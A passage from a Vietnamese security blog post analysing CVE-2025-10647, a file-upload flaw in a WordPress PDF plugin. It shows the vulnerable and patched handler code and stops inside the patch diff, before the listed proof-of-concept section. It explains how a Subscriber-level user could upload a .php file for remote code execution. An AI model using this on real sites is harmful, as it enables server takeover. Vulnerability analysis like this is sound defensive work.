<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="vi">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>CVE-2025-10647 Analysis &amp; POC - Bui Van Y</title><meta name="author" content="Bui Van Y">
<meta name="description" content="Security Vulnerability in WordPress Embed PDF for WPForms Plugin."><meta name="keywords" content='analyst, plugin, arbitrary file upload'>
  <meta itemprop="name" content="CVE-2025-10647 Analysis & POC">
  <meta itemprop="description" content="Security Vulnerability in WordPress Embed PDF for WPForms Plugin.">
  <meta itemprop="datePublished" content="2025-11-06T19:00:00+07:00">
  <meta itemprop="dateModified" content="2025-11-06T19:00:00+07:00">
  <meta itemprop="wordCount" content="1564">
  <meta itemprop="image" content="http://localhost:1313/posts/2025-11-06-cve-2025-10647/app.png">
  <meta itemprop="keywords" content="Analyst,Plugin,Arbitrary File Upload"><meta property="og:url" content="http://localhost:1313/vi/posts/2025-11-06-cve-2025-10647/">
  <meta property="og:site_name" content="Bui Van Y">
  <meta property="og:title" content="CVE-2025-10647 Analysis & POC">
  <meta property="og:description" content="Security Vulnerability in WordPress Embed PDF for WPForms Plugin.">
  <meta property="og:locale" content="vi">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-11-06T19:00:00+07:00">
    <meta property="article:modified_time" content="2025-11-06T19:00:00+07:00">
    <meta property="article:tag" content="Analyst">
    <meta property="article:tag" content="Plugin">
    <meta property="article:tag" content="Arbitrary File Upload">
    <meta property="og:image" content="http://localhost:1313/posts/2025-11-06-cve-2025-10647/app.png">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="http://localhost:1313/posts/2025-11-06-cve-2025-10647/app.png">
  <meta name="twitter:title" content="CVE-2025-10647 Analysis & POC">
  <meta name="twitter:description" content="Security Vulnerability in WordPress Embed PDF for WPForms Plugin.">
<meta name="application-name" content="Bui Van Y">
<meta name="apple-mobile-web-app-title" content="Bui Van Y"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/svg-spinners--wind-toy.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/vi/posts/2025-11-06-cve-2025-10647/" title="CVE-2025-10647 Analysis &amp; POC - Bui Van Y" /><link rel="prev" type="text/html" href="http://localhost:1313/vi/posts/2025-11-05-cve-2025-10147/" title="CVE-2025-10147 Analysis &amp; POC" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/vi/posts/2025-11-06-cve-2025-10647/index.md" title="CVE-2025-10647 Analysis & POC - Bui Van Y"><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "CVE-2025-10647 Analysis \u0026 POC",
    "inLanguage": "vi",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "http:\/\/localhost:1313\/vi\/posts\/2025-11-06-cve-2025-10647\/"
    },"image": ["http:\/\/localhost:1313\/images\/avatar.png"],"genre": "posts","keywords": "analyst, plugin, arbitrary file upload","wordcount":  1564 ,
    "url": "http:\/\/localhost:1313\/vi\/posts\/2025-11-06-cve-2025-10647\/","datePublished": "2025-11-06T19:00:00+07:00","dateModified": "2025-11-06T19:00:00+07:00","publisher": {
      "@type": "Organization",
      "name": "/images/avatar.png","logo": "http:\/\/localhost:1313\/images\/avatar.png"},"author": {
        "@type": "Person",
        "name": "Bui Van Y"
      },"description": "Security Vulnerability in WordPress Embed PDF for WPForms Plugin."
  }
  </script><script src="/js/head/color-scheme.min.js"></script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/vi/" title="Bui Van Y"><img class="logo" src='/images/svg-spinners--wind-toy.svg' alt="Bui Van Y" height="32" width="32"><span class="header-title-text">Bui Van Y</span></a><span class="typeit header-subtitle"><template>w41bu1</template></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a class="menu-link" href="/vi/posts/"><i class="fa-solid fa-file-alt fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
              <a class="menu-link" href="/vi/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a class="menu-link" href="/vi/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
            <input type="text" placeholder="Tìm tiêu đề hoặc nội dung..." id="search-input-desktop">
            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Tìm kiếm">
              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
            </a>
            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Xoá">
              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
            </a>
            <span class="search-button search-loading" id="search-loading-desktop">
              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
            </span>
          </li><li class="menu-item theme-switch" title="Đổi chủ đề">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li><li class="menu-item language-switch">
            <span role="button" aria-label="Chọn Ngôn ngữ" title="Chọn Ngôn ngữ"><i class="fa-solid fa-language fa-fw" aria-hidden="true"></i></span>
            <ul class="sub-menu"><li class="menu-item"><a href="/posts/2025-11-06-cve-2025-10647/" class="menu-link" title="English">English</a></li><li class="menu-item"><span class="text-secondary" title="Vietnamese">Vietnamese</span></li></ul>
          </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/vi/" title="Bui Van Y"><img class="logo" src='/images/svg-spinners--wind-toy.svg' alt="Bui Van Y" height="26" width="26"><span class="header-title-text">Bui Van Y</span></a><span class="typeit header-subtitle"><template>w41bu1</template></span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
            <div class="search mobile" id="search-mobile">
              <input type="text" placeholder="Tìm tiêu đề hoặc nội dung..." id="search-input-mobile">
              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Tìm kiếm">
                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
              </a>
              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Xoá">
                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
              </a>
              <span class="search-button search-loading" id="search-loading-mobile">
                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
              </span>
            </div>
            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
              Huỷ
            </a>
          </li><li class="menu-item"><a class="menu-link" href="/vi/posts/"><i class="fa-solid fa-file-alt fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item"><a class="menu-link" href="/vi/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/vi/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item menu-system">
          <span class="menu-system-item theme-switch" title="Đổi chủ đề"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span><span class="menu-system-item language-switch">
              <span role="button" aria-label="Chọn Ngôn ngữ" title="Chọn Ngôn ngữ">Vietnamese<i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i></span>
              <select class="language-select" onchange="location = this.value;"><option value="/posts/2025-11-06-cve-2025-10647/">English</option><option value="/vi/posts/2025-11-06-cve-2025-10647/" selected disabled>Vietnamese</option></select>
            </span></li>
      </ul>
    </nav>
  </div>
</header><div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
  </div>
  <div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"><div class="details related-details open">
      <div class="details-summary related-summary">
        <i class="fa-solid fa-fire fa-fade text-danger fa-fw" aria-hidden="true"></i>
        <span class="related-title">Nội dung liên quan</span><i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></div>
      <div class="details-content related-content">
        <ul class="related-list"><li class="related-item">
              <a href="/vi/posts/2025-11-05-cve-2025-10147/" title="CVE-2025-10147 Analysis &amp; POC">CVE-2025-10147 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-11-04-cve-2025-62065/" title="CVE-2025-62065 Analysis &amp; POC">CVE-2025-62065 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-11-03-cve-2025-2940/" title="CVE-2025-2940 Analysis &amp; POC">CVE-2025-2940 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-11-02-cve-2025-1043/" title="CVE-2025-1043 Analysis &amp; POC">CVE-2025-1043 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-11-01-cve-2025-52713/" title="CVE-2025-52713 Analysis &amp; POC">CVE-2025-52713 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-10-31-cve-2025-60161/" title="CVE-2025-60161 Analysis &amp; POC">CVE-2025-60161 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-10-30-cve-2025-11128/" title="CVE-2025-11128 Analysis &amp; POC">CVE-2025-11128 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-10-28-cve-2025-6851/" title="CVE-2025-6851 Analysis &amp; POC">CVE-2025-6851 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-10-08-cve-2025-9816/" title="CVE-2025-9816 Analysis &amp; POC">CVE-2025-9816 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2025-10-29-cve-2025-12136/" title="CVE-2025-12136 Analysis &amp; POC">CVE-2025-12136 Analysis &amp; POC</a></li></ul>
      </div>
    </div></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>CVE-2025-10647 Analysis &amp; POC</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><a href="github.com/w41bu1" title="Tác giả" rel=" author" class="author"><img class="avatar" src='/images/avatar.png' alt="Bui Van Y" height="16" width="16">&nbsp;Bui Van Y</a></span><span class="post-included-in">&nbsp;trong <a href="/vi/categories/cve-analyst/" class="post-category" title="Danh mục - CVE Analyst"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> CVE Analyst</a></span></div><div class="post-meta-line"><span title="đăng ngày 2025-11-06 19:00:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-11-06">2025-11-06</time></span>&nbsp;<span title="1564 từ"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>Khoảng 1600 từ</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>8 phút</span>&nbsp;</div>
    </div><div class="featured-image"><img src='/posts/2025-11-06-cve-2025-10647/app.png' alt="/posts/2025-11-06-cve-2025-10647/app.png"></div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>Nội dung</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#cve--basic-info">CVE &amp; Basic Info</a></li>
    <li><a href="#requirements">Requirements</a></li>
    <li><a href="#analysis">Analysis</a>
      <ul>
        <li><a href="#patch-diff">Patch Diff</a></li>
        <li><a href="#vulnerable-code">Vulnerable Code</a></li>
        <li><a href="#flow">Flow</a></li>
      </ul>
    </li>
    <li><a href="#exploit">Exploit</a>
      <ul>
        <li><a href="#proof-of-concept-poc">Proof of Concept (PoC)</a></li>
      </ul>
    </li>
    <li><a href="#conclusion">Conclusion</a></li>
    <li><a href="#key-takeaway">Key Takeaway</a></li>
    <li><a href="#references">References</a></li>
  </ul>
</nav></div>
      </div><div class="content" id="content"><h2 class="heading-element" id="cve--basic-info"><span>CVE &amp; Basic Info</span>
  <a href="#cve--basic-info" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>Plugin <strong>Embed PDF for WPForms</strong> cho <strong>WordPress</strong> bị lỗ hổng cho phép <strong>arbitrary file uploads</strong> do thiếu kiểm tra loại file trong hàm <code>ajax_handler_download_pdf_media</code> ở tất cả các phiên bản đến và bao gồm <strong>1.1.5</strong>. Điều này cho phép kẻ tấn công đã xác thực, với quyền truy cập từ mức <strong>Subscriber</strong> trở lên, tải lên các file tùy ý lên server của site bị ảnh hưởng, và có thể dẫn đến <strong>remote code execution</strong>.</p>
<ul>
<li><strong>CVE ID</strong>: <a href="https://www.cve.org/CVERecord?id=CVE-2025-10647"target="_blank" rel="external nofollow noopener noreferrer">CVE-2025-10647</a></li>
<li><strong>Vulnerability Type</strong>: Arbitrary File Upload</li>
<li><strong>Affected Versions</strong>: &lt;= 1.1.5</li>
<li><strong>Patched Versions</strong>: 1.1.6</li>
<li><strong>CVSS severity</strong>: High (9.9)</li>
<li><strong>Required Privilege</strong>: Subscriber</li>
<li><strong>Product</strong>: <a href="https://wordpress.org/plugins/embed-pdf-wpforms/"target="_blank" rel="external nofollow noopener noreferrer">WordPress Embed PDF for WPForms Plugin</a></li>
</ul>
<h2 class="heading-element" id="requirements"><span>Requirements</span>
  <a href="#requirements" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li><strong>Local WordPress &amp; Debugging</strong>: <a href="https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/"target="_blank" rel="external nofollow noopener noreferrer">Local WordPress and Debugging</a>.</li>
<li><strong>Plugin versions</strong> - <strong>Embed PDF for WPForms</strong>: <strong>1.1.5</strong> (vulnerable) và <strong>1.1.6</strong> (patched).</li>
<li><strong>Diff tool</strong> - <a href="https://meldmerge.org/"target="_blank" rel="external nofollow noopener noreferrer"><strong>Meld</strong></a> hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.</li>
<li><a href="https://wordpress.org/plugins/wpforms-lite/"target="_blank" rel="external nofollow noopener noreferrer"><strong>WPForms Plugin</strong></a></li>
</ul>
<h2 class="heading-element" id="analysis"><span>Analysis</span>
  <a href="#analysis" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><h3 class="heading-element" id="patch-diff"><span>Patch Diff</span>
  <a href="#patch-diff" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><div class="highlight" title="class-wpforms-field-pdf-viewer.php - v1.1.5" data-open="true"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="hl"><span class="lnt"> 8
</span></span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="hl"><span class="lnt">11
</span></span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="hl"><span class="lnt">21
</span></span><span class="hl"><span class="lnt">22
</span></span><span class="hl"><span class="lnt">23
</span></span><span class="hl"><span class="lnt">24
</span></span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="hl"><span class="lnt">28
</span></span><span class="hl"><span class="lnt">29
</span></span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">ajax_handler_download_pdf_media</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">check_ajax_referer</span><span class="p">(</span> <span class="s1">&#39;epdf_wf_download_pdf_media&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">wp_send_json_error</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line hl"><span class="cl">    <span class="nv">$url</span> <span class="o">=</span> <span class="nx">esc_url_raw</span><span class="p">(</span> <span class="nx">wp_unslash</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Download the file.
</span></span></span><span class="line hl"><span class="cl"><span class="c1"></span>    <span class="nv">$tmp_file</span> <span class="o">=</span> <span class="nx">download_url</span><span class="p">(</span> <span class="nv">$url</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="nx">is_wp_error</span><span class="p">(</span> <span class="nv">$tmp_file</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">wp_send_json_error</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="k">array</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="cm">/* translators: 1. An error message. */</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;msg&#39;</span> <span class="o">=&gt;</span> <span class="nx">sprintf</span><span class="p">(</span> <span class="nx">__</span><span class="p">(</span> <span class="s1">&#39;The download failed with error &#34;%s&#34;&#39;</span><span class="p">,</span> <span class="s1">&#39;embed-pdf-wpforms&#39;</span> <span class="p">),</span> <span class="nv">$tmp_file</span><span class="o">-&gt;</span><span class="na">get_error_message</span><span class="p">()</span> <span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Move from a temp file to the uploads directory.
</span></span></span><span class="line hl"><span class="cl"><span class="c1"></span>    <span class="nv">$upload_dir</span> <span class="o">=</span> <span class="nx">wp_upload_dir</span><span class="p">();</span>
</span></span><span class="line hl"><span class="cl">    <span class="nv">$file_name</span>  <span class="o">=</span> <span class="nx">wp_unique_filename</span><span class="p">(</span> <span class="nv">$upload_dir</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">],</span> <span class="nx">basename</span><span class="p">(</span> <span class="nv">$url</span> <span class="p">)</span> <span class="p">);</span>
</span></span><span class="line hl"><span class="cl">    <span class="nv">$path</span>       <span class="o">=</span> <span class="nv">$upload_dir</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="nx">DIRECTORY_SEPARATOR</span> <span class="o">.</span> <span class="nv">$file_name</span><span class="p">;</span>
</span></span><span class="line hl"><span class="cl">    <span class="k">global</span> <span class="nv">$wp_filesystem</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nx">class_exists</span><span class="p">(</span> <span class="s1">&#39;WP_Filesystem&#39;</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">require_once</span> <span class="nx">ABSPATH</span> <span class="o">.</span> <span class="s1">&#39;/wp-admin/includes/file.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line hl"><span class="cl">    <span class="nx">WP_Filesystem</span><span class="p">();</span>
</span></span><span class="line hl"><span class="cl">    <span class="nv">$wp_filesystem</span><span class="o">-&gt;</span><span class="na">move</span><span class="p">(</span> <span class="nv">$tmp_file</span><span class="p">,</span> <span class="nv">$path</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Trong phiên bản lỗi, hàm <code>ajax_handler_download_pdf_media()</code> tải một file PDF từ URL được cung cấp vào Media Library của WordPress thông qua AJAX nhưng không kiểm tra loại file, không kiểm tra quyền người dùng.</p>
<div class="details admonition bug open disabled">
  <div class="details-summary admonition-title"><i class="icon fa-fw fa-solid fa-bug" aria-hidden="true"></i>Lỗi</div>
  <div class="details-content">
    <div class="admonition-content"><p>Attacker có thể upload file <code>.php</code> để thực hiện RCE</p></div>
  </div>
</div><div class="highlight" title="class-wpforms-field-pdf-viewer.php - v1.1.6" data-open="true"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="hl"><span class="lnt"> 4
</span></span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="hl"><span class="lnt">18
</span></span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">ajax_handler_download_pdf_media</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">check_ajax_referer</span><span class="p">(</span> <span class="s1">&#39;epdf_wf_download_pdf_media&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line hl"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nx">current_user_can</span><span class="p">(</span> <span class="s1">&#39;upload_files&#39;</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">wp_send_json_error</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="k">array</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;msg&#39;</span> <span class="o">=&gt;</span> <span class="nx">__</span><span class="p">(</span> <span class="s1">&#39;The download failed&#39;</span><span class="p">,</span> <span class="s1">&#39;embed-pdf-wpforms&#39;</span> <span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">wp_send_json_error</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$url</span> <span class="o">=</span> <span class="nx">esc_url_raw</span><span class="p">(</span> <span class="nx">wp_unslash</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line hl"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nx">wp_check_filetype</span><span class="p">(</span> <span class="nx">basename</span><span class="p">(</span> <span class="nv">$url</span> <span class="p">)</span> <span class="p">)[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">wp_send_json_error</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="k">array</span><span class="p">(</span>
